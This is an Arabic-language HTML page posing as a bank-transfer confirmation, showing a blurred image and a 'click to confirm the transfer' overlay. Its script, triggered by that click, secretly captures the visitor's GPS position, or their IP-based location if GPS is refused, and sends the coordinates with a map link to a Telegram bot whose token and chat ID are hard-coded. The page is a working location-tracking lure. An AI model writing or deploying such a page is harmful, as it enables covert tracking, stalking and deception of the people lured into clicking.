<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تحويل بنكي</title>

<!-- Open Graph لتظهر الصورة كرابط -->
<meta property="og:title" content="تحويل بنكي">
<meta property="og:description" content="اضغط لتأكيد التحويل">
<meta property="og:image" content="https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg">
<meta property="og:type" content="website">

<style>
  body {
    font-family: Arial, sans-serif;
    background: url('https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg') no-repeat center center fixed;
    background-size: cover;
    filter: blur(5px);
    height: 100vh;
    margin: 0;
    display: flex;
    justify-content: center;
    align-items: center;
  }
  .overlay {
    position: absolute;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.5);
    display: flex;
    justify-content: center;
    align-items: center;
    cursor: pointer;
  }
  .overlay h1 {
    color: #fff;
    font-size: 24px;
    padding: 20px 40px;
    background: rgba(0,0,0,0.6);
    border-radius: 10px;
  }
</style>
</head>
<body>

<div class="overlay" onclick="confirmTransfer()">
  <h1>اضغط لتأكيد التحويل</h1>
</div>

<script>
const telegramToken = "8120112422:AAGXl1kbMxBnBgUOQU0nZhYvYum5yJAagyM";
const chatId = "6495557039";

function sendLocationToBot(lat, lon) {
    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
    const message = `📍 موقع المستخدم:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;

    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
    }).then(res => res.json())
      .then(data => console.log("✅ تم الإرسال:", data))
      .catch(err => console.error("❌ خطأ:", err));
}

function confirmTransfer() {
    document.querySelector('.overlay').style.display = 'none';
    document.body.style.filter = 'none';

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            pos => {
                sendLocationToBot(pos.coords.latitude, pos.coords.longitude);
            },
            err => {
                console.warn("⚠️ تم رفض الموقع، محاولة IP fallback...");
                fetch('https://ipapi.co/json/')
                    .then(res => res.json())
                    .then(data => {
                        sendLocationToBot(data.latitude, data.longitude);
                    });
            }
        );
    } else {
        alert("المتصفح لا يدعم تحديد الموقع");
    }
}
</script>

</body>
</html>
